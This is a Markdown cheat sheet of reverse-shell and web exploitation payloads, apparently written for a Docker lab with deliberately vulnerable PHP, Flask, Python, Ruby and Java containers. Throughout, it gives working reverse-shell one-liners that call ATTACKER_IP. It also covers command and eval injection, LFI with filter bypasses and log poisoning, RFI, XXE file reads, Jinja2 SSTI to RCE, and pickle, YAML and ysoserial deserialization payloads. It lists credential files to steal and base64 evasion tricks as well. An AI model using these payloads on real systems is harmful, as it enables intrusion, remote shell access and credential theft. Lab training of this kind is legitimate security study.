# Reverse Shell Payload Cheatsheet

**Target IP:** Replace `ATTACKER_IP` with attacker container IP (check with `ip addr`)
**Default ports:** 4444, 5555, 6666, 7777, 8888, 9999

---

## Quick Reference Table

| Vulnerability | Container | Port | Endpoint | Method |
|--------------|-----------|------|----------|--------|
| PHP Command Execution | victim-php-apache | 8080 | `/vulnerable/exec.php` | GET `?cmd=` |
| PHP Eval Injection | victim-php-apache | 8080 | `/vulnerable/eval.php` | GET `?code=` |
| PHP LFI | victim-php-apache | 8080 | `/vulnerable/lfi.php` | GET `?file=` |
| PHP Log Poisoning | victim-php-apache | 8080 | `/vulnerable/lfi-log.php` | GET + LFI |
| PHP RFI | victim-php-apache | 8080 | `/vulnerable/rfi-raw.php` | GET `?url=` |
| PHP XXE | victim-php-apache | 8080 | `/vulnerable/xxe.php` | POST XML |
| Flask SSTI | victim-flask-ssti | 5000 | `/ssti` | GET `?name=` |
| Python Pickle | victim-python-deser | 5001 | `/pickle` | POST `data=` |
| Ruby YAML | victim-ruby-deser | 4567 | `/yaml` | POST `yaml=` |
| Java Deserialize | victim-java-host | 8081 | `/deserialize` | POST JSON |

---

## Quick Setup (From Attacker Box)

```bash
# Get attacker IP inside Docker network
ip addr show eth0 | grep inet

# Start listeners
./scripts/listeners.sh start

# List all victims
docker ps
```

---

# PART 1: REVERSE SHELL PAYLOADS

## BASH / SH SHELLS

### Bash /dev/tcp
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Bash one-liner (shorter)
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

### Sh fallback (when bash unavailable)
```sh
sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# OR
sh -i 2>&1 | nc ATTACKER_IP 4444
```

### Netcat traditional (-e)
```bash
nc -e /bin/bash ATTACKER_IP 4444
# OR
nc -e /bin/sh ATTACKER_IP 4444
```

### Netcat OpenBSD (-c)
```bash
nc -c /bin/sh ATTACKER_IP 4444
```

### Netcat pipe (no -e or -c)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | nc ATTACKER_IP 4444 | /bin/sh > /tmp/f; rm /tmp/f
```

### Socat (clean TTY)
```bash
socat TCP:ATTACKER_IP:4444 EXEC:sh,pty,stderr,setsid,sigint,sane
```

---

## PYTHON SHELLS

### Python 3 one-liner
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Python 2 one-liner
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);s.close()'
```

### Python with PTY (for full TTY)
```python
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

---

## PHP SHELLS

### PHP one-liner (socket)
```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP with proc_open (better)
```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### PHP web shell (for browser/form)
```php
<?php system($_GET['cmd']); ?>
# Usage: http://victim/vulnerable/exec.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

## PERL SHELLS

### Perl one-liner
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## RUBY SHELLS

### Ruby one-liner
```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## TTY UPGRADE (After Getting Shell)

Once you have a basic shell, upgrade to full TTY:

```bash
# Method 1: Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Method 2: script command
script /dev/null

# After TTY upgrade, fix terminal:
stty raw -echo
fg
export TERM=xterm-256color
```

---

# PART 2: WEB EXPLOITATION

## PHP VULNERABILITIES

### Command Execution

**Endpoint:** `http://target:8080/vulnerable/exec.php`

```bash
# Basic command execution
curl "http://target:8080/vulnerable/exec.php?cmd=whoami"

# Reverse shell via exec.php
curl "http://target:8080/vulnerable/exec.php?cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

### Eval Injection

**Endpoint:** `http://target:8080/vulnerable/eval.php`

```bash
# Execute PHP code
curl "http://target:8080/vulnerable/eval.php?code=system('whoami');"

# Reverse shell via eval.php
curl "http://target:8080/vulnerable/eval.php?code=system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');"

# More complex PHP code
curl "http://target:8080/vulnerable/eval.php?code=phpinfo();"
```

---

## LOCAL FILE INCLUSION (LFI)

### Basic LFI

**Endpoint:** `http://target:8080/vulnerable/lfi.php`

```bash
# Read /etc/passwd
curl "http://target:8080/vulnerable/lfi.php?file=../../../etc/passwd"

# Read Apache logs
curl "http://target:8080/vulnerable/lfi.php?file=../../../var/log/apache2/access.log"

# Read environment variables
curl "http://target:8080/vulnerable/lfi.php?file=/proc/self/environ"

# Read file descriptors
curl "http://target:8080/vulnerable/lfi.php?file=/proc/self/fd/0"
```

### LFI Bypass Techniques

```bash
# Double encoding
curl "http://target/lfi.php?file=..%252F..%252F..%252Fetc/passwd"

# Path truncation (older PHP)
curl "http://target/lfi.php?file=../../../etc/passwd...................."

# Null byte injection (PHP < 5.3.4)
curl "http://target/lfi.php?file=../../../etc/passwd%00"
```

### Useful Files to Read

```
/etc/passwd          # User accounts
/etc/shadow          # Password hashes (if readable)
/etc/group           # Group information
/etc/hosts           # Host file
/etc/apache2/apache2.conf    # Apache config
/var/log/apache2/access.log  # Apache access log
/proc/self/environ   # Environment variables
/proc/self/cmdline   # Command line of current process
/proc/self/cwd/app.py # Current working directory file
/home/user/.ssh/id_rsa   # SSH private keys
```

---

## LFI TO RCE (LOG POISONING)

### Step 1: Poison the Log

```bash
# Poison User-Agent in Apache access log
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target:8080/vulnerable/lfi-log.php
```

### Step 2: Include the Poisoned Log

```bash
# Execute commands via poisoned log
curl "http://target:8080/vulnerable/lfi.php?file=../../../var/log/apache2/access.log&c=whoami"

# Get reverse shell via poisoned log
curl "http://target:8080/vulnerable/lfi.php?file=../../../var/log/apache2/access.log&c=nc -e /bin/bash ATTACKER_IP 4444"
```

### Alternative: /proc/self/environ Poisoning

```bash
# Poison via User-Agent (gets stored in environ)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target:8080/

# Include environ
curl "http://target:8080/vulnerable/lfi.php?file=/proc/self/environ&cmd=whoami"
```

---

## REMOTE FILE INCLUSION (RFI)

### Basic RFI

**Endpoint:** `http://target:8080/vulnerable/rfi-raw.php`

```bash
# Include remote PHP file
curl "http://target:8080/vulnerable/rfi-raw.php?url=http://ATTACKER_IP/shell.php"
```

### Evil.php (host on attacker)

```php
<?php system($_GET['cmd']); ?>
# Or direct reverse shell:
<?php system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"); ?>
```

### RFI via Data URI

```bash
# Execute PHP via data:// URI
curl "http://target:8080/vulnerable/rfi-raw.php?url=data://text/plain,<?php system('whoami'); ?>"
```

### RFI via PHP Input

```bash
# Send PHP code via php://input
curl -X POST "http://target:8080/vulnerable/rfi-raw.php?url=php://input" \
  -d "<?php system('whoami'); ?>"
```

---

## XML EXTERNAL ENTITY (XXE)

### Basic XXE (File Read)

**Endpoint:** `http://target:8080/vulnerable/xxe.php`

```bash
# Read /etc/passwd via XXE
curl -X POST "http://target:8080/vulnerable/xxe.php" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### XXE with PHP Filter (Base64 encode)

```bash
# Base64 encode file contents
curl -X POST "http://target:8080/vulnerable/xxe.php" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
```

### XXE via GET (xxe-simple.php)

```bash
# URL encode the XML payload
curl "http://target:8080/vulnerable/xxe-simple.php?xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E"
```

---

## SERVER-SIDE TEMPLATE INJECTION (SSTI)

### Flask/Jinja2 SSTI

**Endpoint:** `http://target:5000/ssti`

```bash
# Detection - returns 49 if vulnerable
curl "http://target:5000/ssti?name={{7*7}}"

# Read Flask config
curl "http://target:5000/ssti?name={{config}}"

# Access string class
curl "http://target:5000/ssti?name={{''.__class__}}"
```

### SSTI to RCE Payloads

#### Method 1: Using config globals

```bash
# Execute whoami
curl "http://target:5000/ssti?name={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}"

# Get reverse shell
curl "http://target:5000/ssti?name={{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1').read()}}"
```

#### Method 2: Using subprocess

```bash
# First find subprocess index
curl "http://target:5000/ssti?name={{''.__class__.__mro__[1].__subclasses__()}}"

# Then use it (common index: 104, 117, 208, etc.)
curl "http://target:5000/ssti?name={{''.__class__.__mro__[1].__subclasses__()[104]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0]}}"
```

### SSTI Gadget Chain Reference

```
{{7*7}}              # Detection - returns 49
{{config}}           # Flask config
{{''.__class__}}     # String class
{{''.__class__.__mro__}}  # Method Resolution Order
{{''.__class__.__mro__[1].__subclasses__()}}  # All subclasses
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['os'].popen('id').read()}}
```

---

## PYTHON PICKLE DESERIALIZATION

### Generate Pickle Payload

```python
import pickle, os, base64

class ReverseShell:
    def __reduce__(self):
        return (os.system, ('nc -e /bin/bash ATTACKER_IP 4444',))

payload = pickle.dumps(ReverseShell())
b64 = base64.b64encode(payload).decode()
print(b64)
```

### One-Liner Payload Generator

```bash
python3 -c "import pickle,base64,os; class R: def __reduce__(self): return (os.system,('nc ATTACKER_IP 4444 -e /bin/bash',)); print(base64.b64encode(pickle.dumps(R())).decode())"
```

### Send Pickle Payload

**Endpoint:** `http://target:5001/pickle`

```bash
# Via curl
PAYLOAD=$(python3 -c "import pickle,base64,os; class R: def __reduce__(self): return (os.system,('nc 172.28.0.2 4444 -e /bin/bash',)); print(base64.b64encode(pickle.dumps(R())).decode())")
curl -X POST "http://target:5001/pickle" -d "data=$PAYLOAD"

# Or use the payload generator
curl "http://target:5001/generate?ip=ATTACKER_IP&port=4444"
```

### JSON API Endpoint

```bash
# Via JSON API
curl -X POST "http://target:5001/api/unpickle" \
  -H "Content-Type: application/json" \
  -d '{"data": "'$(cat payload.b64)'"}'
```

---

## RUBY YAML DESERIALIZATION

### YAML Payload (Gem::Requirement)

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/hash:WithDefaults
  foo: |-
    bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

### Send YAML Payload

**Endpoint:** `http://target:4567/yaml`

```bash
# Via curl with form data
cat > payload.yaml << 'EOF'
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/hash:WithDefaults
  foo: |-
    bash -c 'bash -i >& /dev/tcp/172.28.0.2/4444 0>&1'
EOF

curl -X POST "http://target:4567/yaml" --data-urlencode "yaml=$(cat payload.yaml)"
```

### Use Built-in Generator

```bash
# Generate payload for specific IP:PORT
curl "http://target:4567/generate?ip=ATTACKER_IP&port=4444"
```

### Alternative YAML Gadgets

```yaml
# Gem::Specification
--- !ruby/object:Gem::Specification
name: #{["bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"]}

# Gem::Installer
--- !ruby/object:Gem::Installer
  spec: !ruby/object:Gem::Specification
    executables:
    - bash
    - -c
    - "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

---

## JAVA DESERIALIZATION

### Using ysoserial

**Endpoint:** `http://target:8081/deserialize`

#### Install ysoserial (on attacker)

```bash
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn clean package -DskipTests
```

#### Generate Payload

```bash
# CommonsCollections5 payload with reverse shell
java -jar target/ysoserial.jar CommonsCollections5 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' > payload.bin

# Base64 encode
base64 -w0 payload.bin > payload.b64
```

#### Send to Target

```bash
# Via JSON API
curl -X POST "http://target:8081/deserialize" \
  -H 'Content-Type: application/json' \
  -d '{"data": "'$(cat payload.b64)'"}'

# Via form endpoint
curl -X POST "http://target:8081/deserialize/form" \
  --data-urlencode "data=$(cat payload.b64)"
```

### ysoserial Gadget Chains

| Gadget | Description |
|--------|-------------|
| CommonsCollections5 | Works with Java 8+ |
| CommonsCollections6 | Alternative for CC5 |
| CommonsCollections7 | Another CC variant |
| C3P0 | For apps with C3P0 connection pool |
| Groovy1 | For Groovy-based apps |
| Spring1/Spring2 | For Spring Framework |
| JDK7u21 | Built-in JDK gadget |

---

## LISTENER SETUP

### Netcat Listener

```bash
nc -lvnp 4444
```

### Netcat with rlwrap (better interactive shell)

```bash
rlwrap nc -lvnp 4444
```

### Socat Listener (with PTY)

```bash
socat TCP-L:4444 PTY
```

### Multiple Listeners

```bash
# Start listeners on multiple ports
for port in 4444 5555 6666 7777; do
    nc -lvnp $port &
done
```

---

## BASE64 ENCODED PAYLOADS

For bypassing simple filters:

```bash
# Create payload
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64

# Execute from victim
echo <base64_payload> | base64 -d | bash
```

---

## TROUBLESHOOTING

**Shell dies immediately?**
- Check listener is actually running
- Verify IP/PORT are correct
- Try different shell (/bin/sh vs /bin/bash)

**Can't type commands?**
- Upgrade TTY (see TTY UPGRADE section)
- Or use: `stty raw -echo; fg`

**Connection times out?**
- Check Docker network connectivity
- Verify both containers are on `drakonix_internal` network
- Use `docker network inspect drakonix_internal` to see IP assignments

**SSTI not working?**
- Try different template syntax: `{{7*7}}`, `${7*7}`, `#{7*7}`
- Check which template engine is used (Jinja2, Twig, FreeMarker, etc.)

**Pickle/YAML deserialization fails?**
- Verify base64 encoding is correct
- Check that the gadget class exists in target's classpath
- For Java: verify Commons Collections is available
